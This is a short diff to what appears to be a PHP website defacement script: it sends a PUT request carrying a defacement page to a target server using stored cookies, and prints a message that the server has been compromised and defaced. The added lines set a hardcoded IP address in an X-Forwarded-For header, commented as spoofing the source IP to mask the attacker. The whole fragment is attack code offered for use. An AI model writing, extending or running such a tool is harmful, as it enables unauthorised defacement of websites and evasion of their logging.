@@ -36,6 +36,8 @@ curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
 curl_setopt($ch, CURLOPT_USERAGENT, $userAgent);
 curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'PUT');
 curl_setopt($ch, CURLOPT_POSTFIELDS, $defacePage);
+$source_ip = '75.206.147.190'; // Replace with your desired source IP address
+curl_setopt($ch, CURLOPT_HTTPHEADER, ["X-Forwarded-For: $source_ip"]);  // Spoofing the source IP
 $response = curl_exec($ch);
 curl_close($ch);
 echo "The website server has been compromised and defaced successfully!";
